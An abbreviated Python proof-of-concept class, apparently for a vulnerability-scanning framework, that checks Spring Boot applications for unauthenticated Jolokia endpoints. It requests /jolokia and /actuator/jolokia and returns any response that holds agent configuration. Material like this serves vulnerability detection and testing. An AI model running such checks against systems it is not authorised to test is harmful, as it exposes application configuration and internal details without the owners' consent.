...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth jolokia Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/jolokia","/actuator/jolokia"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if '"config":{' in res.text and '"agentId":"' in res.text and "application" in res.text:
                return res.text
